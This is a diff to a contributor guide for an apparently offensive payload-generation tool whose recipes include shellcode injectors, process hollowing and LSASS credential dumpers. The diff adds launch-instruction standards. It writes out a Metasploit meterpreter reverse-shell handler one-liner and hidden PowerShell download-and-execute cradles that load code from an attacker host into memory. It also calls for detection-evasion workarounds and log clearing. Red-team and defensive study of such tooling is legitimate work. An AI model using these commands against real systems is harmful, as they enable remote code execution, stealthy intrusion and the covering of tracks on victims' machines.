@@ -617,7 +617,6 @@ output:
     Remove-Item {{ output_file }} -Force
 ```
 
-
 ---
 
 ## Best Practices
@@ -636,9 +635,11 @@ output:
 ### Naming Conventions
 
 #### File Naming
+
 Follow the pattern: `description_encryption_language.yaml`
 
 Examples:
+
 - `shellcode_injector_xor_csharp.yaml`
 - `remote_process_injector_xor_csharp.yaml`
 - `shellcode_runner_addtype_powershell.yaml`
@@ -646,15 +647,18 @@ Examples:
 - `process_hollowing_xor_csharp.yaml`
 
 **Rules:**
+
 - Use underscores to separate words
 - Put encryption type before language (if applicable)
 - Always end with language identifier
 - Use lowercase throughout
 
 #### Meta Name Format
+
 Follow the pattern: `"Description, Encryption (Language)"`
 
 Examples:
+
 - `"Remote Process Injector, XOR (C#)"`
 - `"Shellcode Runner, Add-Type (PowerShell)"`
 - `"Linux Shellcode Loader, XOR (C)"`
@@ -662,6 +666,7 @@ Examples:
 - `"LSASS MiniDump Credential Dumper (PowerShell)"` (no encryption)
 
 **Rules:**
+
 - Use title case for description
 - Add comma before encryption type (if applicable)
 - Put language in parentheses at the end
@@ -697,7 +702,9 @@ Examples:
 5. **Plain text only** - Do NOT use markdown formatting (no `#` headers, `**bold**`, `` `code` ``, etc.). The TUI uses Rich markup for display, and markdown syntax will be shown literally to users.
 
 #### Metasploit Listener
+
 Use one-liner format only:
+
 ```
 msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 ```
@@ -705,9 +712,11 @@ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/re
 Do NOT include manual step-by-step msfconsole instructions.
 
 #### Transfer and Execution
+
 Combine these steps and show in-memory execution patterns:
 
 **For PowerShell Scripts (.ps1):**
+
 ```powershell
 # Run from memory without touching disk
 powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/script.ps1')"
@@ -717,6 +726,7 @@ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).Download
 ```
 
 **For Compiled Binaries (.exe):**
+
 ```powershell
 # Execute binary in memory
 $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
@@ -730,6 +740,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 ```
 
 **For DLLs:**
+
 ```powershell
 # Interact with DLL classes in memory
 $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/library.dll')
@@ -740,6 +751,7 @@ $method.Invoke(0, $null)
 ```
 
 **Traditional file-based execution** (if in-memory not applicable):
+
 ```powershell
 # Download and execute
 Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
@@ -748,17 +760,20 @@ Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ outpu
 #### Required Sections
 
 **Notes:**
+
 - Key features and capabilities
 - Encryption/obfuscation details
 - Target requirements
 - OPSEC considerations
 
 **Troubleshooting:**
+
 - Common failure scenarios and solutions
 - Compatibility issues
 - Detection/blocking workarounds
 
 **Cleanup:**
+
 - How to remove artifacts
 - File deletion commands
 - Log clearing (if applicable)
@@ -1113,6 +1128,53 @@ If your generated C# has `byte[] buf = new byte[] { };` (empty array):
 3. Ensure the template variable exists in the preprocessing output
 4. Check preprocessor script is actually being executed (look for errors in build log)
 5. Remember: Command outputs are automatically base64-encoded - preprocessors handle decoding
+
+### Launch Instructions Standards
+
+All recipes should follow these standards for consistency:
+
+**Code Segment Formatting**: All command examples in launch instructions should start with "$ " (dollar sign + space)
+
+```
+$ python3 -m http.server 80
+$ msfconsole -x "..."
+$ powershell -ep bypass -c "..."
+```
+
+**HTTP Server Port**: Always use port 80 for Python HTTP server
+
+```
+$ python3 -m http.server 80
+```
+
+**Download Commands**: Reference port 80 in all download examples
+
+```
+$ wget http://{{ lhost }}/{{ output_file }}
+$ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}"
+```
+
+**One-Liner Format**: Msfconsole commands should be single-line with `-x` flag
+
+```
+$ msfconsole -x "use exploit/multi/handler; set payload ...; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+```
+
+**In-Memory Execution**: Always provide in-memory download+execute pattern
+
+```
+$ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+$ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Class]::Main(@())"
+```
+
+**Section Order**: Launch instructions should always follow this structure:
+
+1. Start Listener (if applicable)
+2. Transfer and Execute (or In-Memory Execution)
+3. Alternative methods (SMB, file-based, etc.)
+4. Notes (technical details, detection info)
+5. Troubleshooting (common issues and solutions)
+6. Cleanup (removal commands)
 
 ### Data Flow Summary
 
